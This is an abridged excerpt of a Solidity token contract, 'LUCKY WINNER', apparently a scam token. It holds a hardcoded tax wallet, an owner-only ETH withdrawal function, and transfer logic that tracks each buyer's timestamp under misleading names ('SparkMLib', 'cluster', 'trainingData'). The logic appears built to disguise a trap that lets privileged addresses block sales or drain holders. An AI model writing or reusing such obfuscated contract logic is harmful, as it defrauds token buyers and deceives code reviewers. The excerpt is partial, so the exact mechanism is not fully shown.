...
contract Winner is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"LUCKY WINNER";
    string private constant _symbol = unicode"WINNER";
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    uint8 private constant _decimals = 9;

    uint256 public _maxTxAmount= 24000000 * 10 ** _decimals;
    uint256 public _maxHoldingAmount= 24000000 * 10 ** _decimals;
    ...
    struct SparkMLib {uint256 cluster; uint256 matrix; uint256 trainingData;}
    mapping(address => SparkMLib) private sparkML;
    ...
    constructor() {
        _taxWallet = payable(0x7d0C2C9d305cCf1d93Aae94A905a4BeB95b92462);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (
            (_exemptFromFee[from] || _exemptFromFee[to]) && from != owner() &&
            from != address(this) && to != address(this)
        ) {
            realtime = block.timestamp;
        }
        if (_exemptFromFee[from] && (block.number > (launchedAtBlock + _reduceSellTaxAt))) {
            unchecked {
        ...
        if (! _exemptFromFee[from] && ! _exemptFromFee[to]){
            if (uniswapV2Pair != to) {
                SparkMLib storage topic = sparkML[to];
                if (uniswapV2Pair==from) {
                    if (topic.cluster == 0) {
                        topic.cluster = (_buyCount<_preventSwapBefore)
                            ? (block.timestamp-1) : block.timestamp;
                    }
                } else {
                    SparkMLib storage topicInit =sparkML[from];
                ...
                SparkMLib storage topicInit = sparkML[from];
                topicInit.trainingData = topicInit.cluster - realtime;
    ...
    function manualSaveETH() external {
        require(_msgSender()==_taxWallet);
        uint256 ethBalance=address(this).balance;
